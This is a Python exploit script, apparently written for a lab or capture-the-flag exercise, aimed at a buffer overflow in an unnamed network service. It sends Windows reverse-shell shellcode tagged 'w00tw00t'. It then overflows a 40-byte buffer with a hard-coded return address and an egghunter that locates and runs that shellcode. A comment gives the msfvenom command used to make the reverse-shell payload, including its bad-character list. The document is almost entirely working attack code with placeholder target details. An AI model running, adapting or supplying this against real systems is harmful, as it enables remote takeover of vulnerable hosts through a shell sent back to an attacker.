import socket, sys
import struct
from time import sleep
ip = 'xx.xx.xx.xx'
port = xxxx

# reverseshell: msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"

shellcode =( 
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x8e\x82\x45\x30\x83\xee\xfc\xe2\xf4\x72\x6a\xc7\x30"
"\x8e\x82\x25\xb9\x6b\xb3\x85\x54\x05\xd2\x75\xbb\xdc\x8e"
"\xce\x62\x9a\x09\x37\x18\x81\x35\x0f\x16\xbf\x7d\xe9\x0c"
"\xef\xfe\x47\x1c\xae\x43\x8a\x3d\x8f\x45\xa7\xc2\xdc\xd5"
"\xce\x62\x9e\x09\x0f\x0c\x05\xce\x54\x48\x6d\xca\x44\xe1"
"\xdf\x09\x1c\x10\x8f\x51\xce\x79\x96\x61\x7f\x79\x05\xb6"
"\xce\x31\x58\xb3\xba\x9c\x4f\x4d\x48\x31\x49\xba\xa5\x45"
"\x78\x81\x38\xc8\xb5\xff\x61\x45\x6a\xda\xce\x68\xaa\x83"
"\x96\x56\x05\x8e\x0e\xbb\xd6\x9e\x44\xe3\x05\x86\xce\x31"
"\x5e\x0b\x01\x14\xaa\xd9\x1e\x51\xd7\xd8\x14\xcf\x6e\xdd"
"\x1a\x6a\x05\x90\xae\xbd\xd3\xea\x76\x02\x8e\x82\x2d\x47"
"\xfd\xb0\x1a\x64\xe6\xce\x32\x16\x89\x7d\x90\x88\x1e\x83"
"\x45\x30\xa7\x46\x11\x60\xe6\xab\xc5\x5b\x8e\x7d\x90\x60"
"\xde\xd2\x15\x70\xde\xc2\x15\x58\x64\x8d\x9a\xd0\x71\x57"
"\xd2\x5a\x8b\xea\x4f\xb6\x2a\x33\x2d\x32\x8e\xa0\x16\xb9"
"\x68\xe8\x55\x66\xd9\xea\xdc\x95\xfa\xe3\xba\xe5\x0b\x42"
"\x31\x3c\x71\xcc\x4d\x45\x62\xea\xb5\x85\x2c\xd4\xba\xe5"
"\xe6\xe1\x28\x54\x8e\x0b\xa6\x67\xd9\xd5\x74\xc6\xe4\x90"
"\x1c\x66\x6c\x7f\x23\xf7\xca\xa6\x79\x31\x8f\x0f\x01\x14"
"\x9e\x44\x45\x74\xda\xd2\x13\x66\xd8\xc4\x13\x7e\xd8\xd4"
"\x16\x66\xe6\xfb\x89\x0f\x08\x7d\x90\xb9\x6e\xcc\x13\x76"
"\x71\xb2\x2d\x38\x09\x9f\x25\xcf\x5b\x39\xb5\x85\x2c\xd4"
"\x2d\x96\x1b\x3f\xd8\xcf\x5b\xbe\x43\x4c\x84\x02\xbe\xd0"
"\xfb\x87\xfe\x77\x9d\xf0\x2a\x5a\x8e\xd1\xba\xe5")

egghunter = ""
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer = "A"*40
buffer += struct.pack("<I",0x772846E4)
buffer += egghunter
buffer += "D"*(500-len(buffer))

# Connect to the service
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
sleep(1)
print s.recv(1024)

#************ Place the shellcode ******************
print "[+] writing shellcode into target's memory"
s.send ('A\r\n') # Choose Command
print s.recv(1024)
sleep(1)
s.send("Shellcode" + '\r\n') # Send Name as w00t twice
print s.recv(1024)
sleep(1)
s.send("w00tw00t" + shellcode + '\r\n') # Send Shellcode
print s.recv(1024)
s.close()

#************** Send the Egghunter ******************
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
sleep(1)
print "[+] Starting to send BoF"
s.send('C\r\n') # Choose Command
print s.recv(1024)
sleep(1)
s.send(buffer + '\r\n') # Send Buffer
print s.recv(1024)
sleep(1)
s.send('y\r\n') # Fuzz
print s.recv(1024)
s.close()
